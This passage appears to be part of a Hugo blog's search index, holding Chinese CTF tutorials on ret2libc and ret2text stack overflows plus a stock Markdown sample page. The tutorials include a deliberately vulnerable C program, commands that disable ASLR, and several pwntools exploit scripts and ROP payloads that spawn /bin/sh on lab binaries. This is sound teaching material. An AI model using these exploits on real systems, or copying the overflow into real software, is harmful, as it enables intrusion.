__libc_start_main_addr = u32(__libc_start_main_addr) else: print(\u0026#34;程序结束\u0026#34;) exit() __libc_start_main_offset = 0x23ca0 system_offset = 0x4dd10 bin_sh_offset = 0x1b9dcd # 计算libc基地址 libc_base_addr = __libc_start_main_addr - __libc_start_main_offset system_addr = libc_base_addr + system_offset bin_sh_addr = libc_base_addr + bin_sh_offset # 第二个payload # system(\u0026#34;/bin/sh\u0026#34;) ===\u0026gt; 0xaaaa payload = padding * b\u0026#39;a\u0026#39; payload += p32(system_addr) payload += p32(0xaaaa) # 没有意义的返回地址 payload += p32(bin_sh_addr) io.sendline(payload) io.interactive() 相关网站\nlieanu/LibcSearcher: glibc offset search for ctf. (github.com)\nniklasb/libc-database: Build a database of libc offsets to simplify exploitation (github.com) ===\u0026gt; libc-database\n基本ROP之ret2libc3-CSDN博客\n总结 调用输出函数泄露__libc_start_main的内存地址 通过偏移量计算libc的基地址 只要知道任意函数在libc中的偏移量就能知道libc中函数的内存地址 调用system(\u0026quot;/bin/sh\u0026quot;)拿shell ","date":"2024-10-27T16:35:07+08:00","permalink":"https://Pwn3r4llD4ys.github.io/p/ret2libc/","title":"Ret2libc"},{"content":"ret2text Return-to-text (ret2text) 是一种利用技术，它通过劫持程序的控制流并重定向到已存在的可执行文本（即程序代码）的某个位置来执行任意代码。\n漏洞源码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; char sh[] = \u0026#34;/bin/sh\u0026#34;; int func() { system(sh); return 0; } int dofunc() { char data[8]={}; puts(\u0026#34;input:\u0026#34;); read(0,data,0x100); return 0; } int main() { dofunc(); return 0; } ASLR ASLR（Address Space Layout Randomization）会随机化进程在内存中的关键区域位置。每次进程启动时，堆、栈、共享库和可执行文件的加载地址都会被随机化。这使得攻击者难以预测内存地址，从而增加了利用漏洞的难度。一般情况下都关闭。\n临时关闭\n1 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 永久关闭\n1 2 echo \u0026#34;kernel.randomize_va_space = 0\u0026#34; | sudo tee -a /etc/sysctl.conf sudo sysctl -p x86 1 gcc ret2text.c -m32 -fno-stack-protector -no-pie -o ret2text_x86 -m32 生成32位程序\n-fno-stack-protector 禁用栈保护机制（Stack Protector）\n栈保护机制通过在栈上放置一个 \u0026ldquo;canary\u0026rdquo; 值来检测栈溢出漏洞\n-no-pie 禁用位置无关可执行文件（Position Independent Executable, PIE）\n位置无关可执行文件使得代码在不同的内存地址运行，每次加载都会随机化地址空间\n查看保护机制 dofunc栈帧 esp -\u0026gt; 0xffffd330\nebp -\u0026gt; 0xffffd358\nebp和esp的差值是0x18中，0x18=0x4(保存ebx) + 0x14(开辟栈帧)\n栈帧开辟具体细节\ncall dofunc 即 push eip,jmp \u0026amp;dofunc 保存eip并跳到dofunc的首地址 push ebp 保存上一个栈帧的ebp mov ebp,esp ebp和esp指向同一地址，此时栈帧空间为0 sub esp.0x20 esp向低地址移动开辟新的栈帧 栈帧清除具体细节\nleave 即 mov esp,ebp pop ebp 新的栈帧关闭，ebp变为0xffffd358 ret 即 pop eip 返回之前eip的地址 反编译dofunc 查看栈布局\n从数组的起始地址到保存的eip的地址的差值为0x10+0x4=0x14\n尝试篡改eip的地址，输入8个a\n栈溢出的原因是没有对输入的数据长度做限制，过长的输入会覆盖内存中返回地址的数据，如果能输到修改eip的地址值就可以劫持函数流程\n这里要输入20个a来填充数据，16个a填充栈帧，4个a覆盖ebp，后面加上func的起始地址0x8049186即可\n0x8049186本质上就是4个通过ASCII表映射的字符，其中0x8 0x04 0x91 0x86在ASCII中都是不可打印字符，需要通过pwntools输入\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import pwn # 属性设置 pwn.context.log_level = \u0026#39;debug\u0026#39; pwn.context.arch = \u0026#39;i386\u0026#39; pwn.context.os = \u0026#39;linux\u0026#39; # 为当前文件创建进程 filePath = \u0026#39;./ret2text_x86\u0026#39; io = pwn.process(filePath) # 用gdb附加调试进程，一般不用调试 pwn.gdb.attach(io) # 20个字符和一个32位地址组成payload padding = 0x14 funcAddr = 0x8049186 # payload = padding * b\u0026#39;a\u0026#39; + pwn.p32(funcAddr) # payload使用字符串拼接需要用p32 p64转为小端序 payload = pwn.flat([padding * b\u0026#39;a\u0026#39;, funcAddr]) # flat自动进行数据对齐和大端序小端序调整 io.sendafter(\u0026#39;input:\u0026#39;, payload) # 在程序输出input后发送payload io.interactive() # 进入交互模式 x86_seq 1 gcc ret2text.c -m32 -fno-stack-protector -no-pie -fomit-frame-pointer -o ret2text_x86_sep 相比于上面的程序这里省略了帧指针，增大了调试的难度\n可以看到dofunc直接省略了对ebp的操作\n省略了帧指针后ebp被当作通用寄存器进行使用，不再用于维护栈帧的边界\nexp和上面相同\nx64 1 gcc ret2text.c -fno-stack-protector -no-pie -o ret2text_x64 exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.arch = \u0026#39;amd64\u0026#39; context.os = \u0026#39;linux\u0026#39; filePath = \u0026#39;./ret2text_x64\u0026#39; io = process(filePath) padding = 0x10 funcAddr = 0x401146 payload = b\u0026#39;a\u0026#39; * padding payload += p64(funcAddr) # gdb.attach(io) io.sendafter(b\u0026#39;input:\u0026#39;, payload) io.interactive() x64堆栈平衡 结果显示\n1 2 [*] Process \u0026#39;./ret2text_x64\u0026#39; stopped with exit code -11 (SIGSEGV) (pid 157267) [*] Got EOF while sending in interactive 这是由于64位机器在函数调用约定上要求栈在调用指令之前必须是16字节对齐的\n16 Bytes Stack Alignment 的 MOVAPS 問題 - Hack543 \u0026mdash; 16 Bytes Stack Alignment 的 MOVAPS 問題 - Hack543\nret2text涉及到的堆栈平衡问题_ret2text pie nx-CSDN博客\n解决方案\n使用execv()代替system()\n在 64 位架构下，执行命令的函数通常需要注意堆栈平衡，以确保函数调用遵循 ABI 规范，并保证程序的正确性和稳定性。然而，有一种特殊的情况，即使用 syscall 指令直接调用系统调用（如 execve），可以不考虑堆栈平衡。这是因为 syscall 指令直接与内核交互，而不是通过常规的用户态函数调用机制。\n手动进行16字节对齐\n查找retgadget地址\n写入payload\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.arch = \u0026#39;amd64\u0026#39; context.os = \u0026#39;linux\u0026#39; filePath = \u0026#39;./ret2text_x64\u0026#39; io = process(filePath) padding = 0x10 retAddr = 0x401016 # 查找到gadget地址 funcAddr = 0x401146 # 这样payload总共32字节，可以进行16字节对齐 payload = b\u0026#39;a\u0026#39; * padding # 16字节 payload += p64(retAddr) # 8字节 payload += p64(funcAddr) # 8字节 # gdb.attach(io) io.sendafter(b\u0026#39;input:\u0026#39;, payload) io.interactive() 函数传参 函数调用约定 x86(32bit)\ncdecl:参数从右到左入栈，调用者清理栈。 常用于 c/c++ 程序\nstdcall:参数从右到左入栈，被调用者清理栈。 常用于 windows api\nfastcall:前两个参数使用 ECX 和 EDX 寄存器，其余参数从右到左入栈。\nx86-64(64bit)\nSystem V AMD64 ABI(大多数UNIX系统):前六个整数或指针类型的参数使用 RDI、RSI、RDX、RCX、R8 和 R9 寄存器传递，其余参数入栈。\nMicrosoft x64:前四个参数使用 RCX、RDX、R8 和 R9 寄存器传递，其余参数入栈。\narm(32bit 64bit)\nAAPCS:\n前四个参数使用 R0-R3 寄存器传递，其余参数入栈 (32-bit)。\n前八个参数使用 X0-X7 寄存器传递，其余参数入栈**(64-bit)**。\nx86 源码变种\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // ret2text_args.c #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; char sh[] = \u0026#34;/bin/sh\u0026#34;; // 现在system需要传sh int func(char* cmd) { system(cmd); return 0; } int dofunc() { char data[8]={}; puts(\u0026#34;input:\u0026#34;); read(0,data,0x100); return 0; } int main() { dofunc(); return 0; } 如果有这样的函数\n1 2 3 4 int sum(int arg1,int arg2,int arg3) { return arg1 + arg2 + arg3; } 对于cdecl栈区的布局会像是这样的**(参数从右往左进栈)**\n编译\u0026amp;调试 1 gcc ret2text_args.c -m32 -fno-stack-protector -no-pie -o ret2text_x86_args 输了8个a，需要覆盖掉0xffffd34c(func地址)和0xffffd350(参数地址)，总共要0x14个a\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.arch = \u0026#39;i386\u0026#39; context.os = \u0026#39;linux\u0026#39; filePath = \u0026#39;./ret2text_x86_args\u0026#39; io = process(filePath) padding = 0x14 funcAddr = 0x8049186 randomAddr = 0xdeadbeef # 用于满足cdecl函数调用约定的占位，是func执行后的地址，一般不关心 bashAddr = 0x804c018 payload = flat([padding * b\u0026#39;a\u0026#39;, funcAddr, randomAddr, bashAddr]) io.sendafter(\u0026#39;input:\u0026#39;, payload) io.interactive() 如果是call_func那么payload为padding * b'a' + call_func_addr + bash_addr\n多个函数调用如何写 payload ？\nx64 x64相比于x86在cdecl上优先使用寄存器来传递参数，劫持的关键在于控制寄存器的内容\n涉及到的寄存器有rdi, rsi, rdx, rcx, r8, r9\n寄存器无法传递的参数用栈传递\n设置返回地址为func的地址，寄存器rdi的值为\u0026quot;/bin/sh\u0026quot;的内存地址，理想情况下能运行一个shell，但是在do_system中遇到了16字节对齐，如果没有进行对齐CPU会触发一个一般保护故障，后续就无法取得shell\n解决方案：pwn技术分享—执行system前为何要执行retn指令_哔哩哔哩_bilibili\nROP ROP（Return-Oriented Programming）编程是一种用于绕过程序安全保护的技术，特别是在存在栈溢出或缓冲区溢出漏洞时。\nROP的核心思想就是把内存中的汇编代码片段组装成一系列的汇编代码块，每个代码片段的最后一个指令都要求能控制rip的值，这样的指令有call jmp pop，在栈上写入一系列gadget地址就可进行ROP,ROP的运行过程和链表非常类似。\n在ret2text_x64中寻找的gadget\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 Gadgets information ============================================================ 0x0000000000401057 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020 0x00000000004010bb : add bh, bh ; loopne 0x401125 ; nop ; ret 0x0000000000401037 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401020 0x000000000040119b : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret 0x0000000000401088 : add byte ptr [rax], al ; add byte ptr [rax], al ; nop dword ptr [rax] ; ret 0x000000000040115a : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret 0x000000000040119c : add byte ptr [rax], al ; add cl, cl ; ret 0x000000000040112a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret 0x0000000000401039 : add byte ptr [rax], al ; jmp 0x401020 0x000000000040119d : add byte ptr [rax], al ; leave ; ret 0x000000000040108a : add byte ptr [rax], al ; nop dword ptr [rax] ; ret 0x000000000040115c : add byte ptr [rax], al ; pop rbp ; ret 0x0000000000401034 : add byte ptr [rax], al ; push 0 ; jmp 0x401020 0x0000000000401044 : add byte ptr [rax], al ; push 1 ; jmp 0x401020 0x0000000000401054 : add byte ptr [rax], al ; push 2 ; jmp 0x401020 0x0000000000401009 : add byte ptr [rax], al ; test rax, rax ; je 0x401012 ; call rax 0x000000000040112b : add byte ptr [rcx], al ; pop rbp ; ret 0x000000000040119e : add cl, cl ; ret 0x00000000004010ba : add dil, dil ; loopne 0x401125 ; nop ; ret 0x0000000000401047 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x401020 0x000000000040112c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret 0x0000000000401127 : add eax, 0x2f03 ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret 0x0000000000401128 : add ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret 0x0000000000401013 : add esp, 8 ; ret 0x0000000000401012 : add rsp, 8 ; ret 0x0000000000401010 : call rax 0x0000000000401143 : cli ; jmp 0x4010d0 0x0000000000401140 : endbr64 ; jmp 0x4010d0 0x000000000040100e : je 0x401012 ; call rax 0x00000000004010b5 : je 0x4010c0 ; mov edi, 0x404030 ; jmp rax 0x00000000004010f7 : je 0x401100 ; mov edi, 0x404030 ; jmp rax 0x000000000040103b : jmp 0x401020 0x0000000000401144 : jmp 0x4010d0 0x00000000004010bc : jmp rax 0x000000000040119f : leave ; ret 0x00000000004010bd : loopne 0x401125 ; nop ; ret 0x0000000000401126 : mov byte ptr [rip + 0x2f03], 1 ; pop rbp ; ret 0x000000000040119a : mov eax, 0 ; leave ; ret 0x0000000000401159 : mov eax, 0 ; pop rbp ; ret 0x00000000004010b7 : mov edi, 0x404030 ; jmp rax 0x0000000000401052 : mov edx, 0x6800002f ; add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020 0x00000000004010bf : nop ; ret 0x000000000040113c : nop dword ptr [rax] ; endbr64 ; jmp 0x4010d0 0x000000000040108c : nop dword ptr [rax] ; ret 0x00000000004010b6 : or dword ptr [rdi + 0x404030], edi ; jmp rax 0x000000000040112d : pop rbp ; ret 0x0000000000401036 : push 0 ; jmp 0x401020 0x0000000000401046 : push 1 ; jmp 0x401020 0x0000000000401056 : push 2 ; jmp 0x401020 0x0000000000401016 : ret 0x0000000000401042 : ret 0x2f 0x0000000000401022 : retf 0x2f 0x000000000040100d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret 0x00000000004011b9 : sub esp, 8 ; add rsp, 8 ; ret 0x00000000004011b8 : sub rsp, 8 ; add rsp, 8 ; ret 0x000000000040100c : test eax, eax ; je 0x401012 ; call rax 0x00000000004010b3 : test eax, eax ; je 0x4010c0 ; mov edi, 0x404030 ; jmp rax 0x00000000004010f5 : test eax, eax ; je 0x401100 ; mov edi, 0x404030 ; jmp rax 0x000000000040100b : test rax, rax ; je 0x401012 ; call rax 0x00000000004010b8 : xor byte ptr [rax + 0x40], al ; add bh, bh ; loopne 0x401125 ; nop ; ret Unique gadgets found: 60 栈布局\n这里的pop rdi;ret相当于把栈顶的值给rdi，此时间接改变了rdi的值，成功给func传参\n1 payload = b\u0026#39;a\u0026#39; * padding + p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(func_addr) 减少溢出空间 如果溢出空间有限呢？\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; char sh[] = \u0026#34;/bin/sh\u0026#34;; int func(char* cmd) { system(cmd); return 0; } int dofunc() { char data[8]={}; puts(\u0026#34;input:\u0026#34;); read(0,data,0x18); // 0x100改为0x18 return 0; } int main() { dofunc(); return 0; } x86下payload\n1 payload = padding * b\u0026#39;a\u0026#39; + p32(call_system_addr) + p32(sh_addr) # /bin/sh改为sh减少空间占用 ","date":"2024-10-27T12:12:18+08:00","permalink":"https://Pwn3r4llD4ys.github.io/p/ret2text/","title":"Ret2text"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\nTables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Italics Bold Code italics bold code A B C D E F Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus ultricies, sapien non euismod aliquam, dui ligula tincidunt odio, at accumsan nulla sapien eget ex. Proin eleifend dictum ipsum, non euismod ipsum pulvinar et. Vivamus sollicitudin, quam in pulvinar aliquam, metus elit pretium purus Proin sit amet velit nec enim imperdiet vehicula. Ut bibendum vestibulum quam, eu egestas turpis gravida nec Sed scelerisque nec turpis vel viverra. Vivamus vitae pretium sapien Code Blocks Code block with backticks 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Diff code block 1 2 3 4 5 [dependencies.bevy] git = \u0026#34;https://github.com/bevyengine/bevy\u0026#34; rev = \u0026#34;11f52b8c72fc3a568e8bb4a4cd1f3eb025ac2e13\u0026#34; - features = [\u0026#34;dynamic\u0026#34;] + features = [\u0026#34;jpeg\u0026#34;, \u0026#34;dynamic\u0026#34;] List Types Ordered List First item Second item Third item Unordered List List item Another item And another item Nested list Fruit Apple Orange Banana Dairy Milk Cheese Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL + ALT + Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nHyperlinked image The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2019-03-11T00:00:00Z","image":"https://Pwn3r4llD4ys.github.io/p/markdown-syntax-guide/pawel-czerwinski-8uZPynIu-rQ-unsplash_hu6307248181568134095.jpg","permalink":"https://Pwn3r4llD4ys.github.io/p/markdown-syntax-guide/","title":"Markdown Syntax Guide"}]